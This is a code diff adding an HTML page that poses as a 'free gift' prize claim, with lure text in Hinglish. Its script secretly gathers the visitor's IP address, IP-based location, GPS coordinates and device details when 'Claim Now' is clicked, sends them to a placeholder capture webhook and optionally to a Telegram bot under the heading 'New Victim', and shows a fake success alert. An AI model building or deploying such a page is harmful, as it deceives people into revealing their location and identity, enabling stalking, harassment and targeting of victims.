@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Free Gift 🎁</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background: linear-gradient(135deg, #667eea, #764ba2);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+    color: white;
+    text-align: center;
+  }
+  .box {
+    background: rgba(255,255,255,0.15);
+    padding: 40px;
+    border-radius: 20px;
+    backdrop-filter: blur(10px);
+  }
+  button {
+    padding: 15px 40px;
+    font-size: 18px;
+    border: none;
+    border-radius: 50px;
+    background: #fff;
+    color: #764ba2;
+    cursor: pointer;
+    font-weight: bold;
+    margin-top: 20px;
+  }
+</style>
+</head>
+<body>
+<div class="box">
+  <h1>🎁 Congratulations!</h1>
+  <p>Aapne ek free gift jeeta hai!</p>
+  <p>Claim karne ke liye niche click karein</p>
+  <button onclick="getData()">Claim Now</button>
+</div>
+
+<script>
+// 🔑 Yahan apna webhook URL ya API endpoint daalein
+const WEBHOOK_URL = "https://your-server.com/capture"; 
+
+async function getData() {
+  let data = {
+    time: new Date().toLocaleString(),
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    screen: window.screen.width + "x" + window.screen.height
+  };
+
+  // IP Address fetch
+  try {
+    const ipRes = await fetch("https://api.ipify.org?format=json");
+    const ipData = await ipRes.json();
+    data.ip = ipData.ip;
+
+    // IP se location
+    const locRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+    const locData = await locRes.json();
+    data.city = locData.city;
+    data.region = locData.region;
+    data.country = locData.country_name;
+    data.isp = locData.org;
+    data.lat = locData.latitude;
+    data.lon = locData.longitude;
+  } catch(e) {
+    data.ipError = e.message;
+  }
+
+  // GPS Location (permission maangega)
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        data.gpsLat = pos.coords.latitude;
+        data.gpsLon = pos.coords.longitude;
+        data.accuracy = pos.coords.accuracy;
+        sendData(data);
+      },
+      (err) => {
+        data.gpsError = err.message;
+        sendData(data);
+      }
+    );
+  } else {
+    sendData(data);
+  }
+}
+
+function sendData(data) {
+  // Apne server pe bhejein
+  fetch(WEBHOOK_URL, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify(data)
+  }).catch(()=>{});
+
+  // Telegram pe bhejna ho to:
+  // sendToTelegram(data);
+
+  alert("✅ Gift claim ho gaya! (Demo)");
+}
+
+// 📱 Telegram Bot Integration (optional)
+function sendToTelegram(data) {
+  const BOT_TOKEN = "YOUR_BOT_TOKEN";
+  const CHAT_ID = "YOUR_CHAT_ID";
+  const text = `🎯 New Victim\n\nIP: ${data.ip}\nCity: ${data.city}\nGPS: ${data.gpsLat},${data.gpsLon}\nDevice: ${data.platform}\nUA: ${data.userAgent}`;
+  
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({chat_id: CHAT_ID, text: text})
+  });
+}
+</script>
+</body>
+</html>
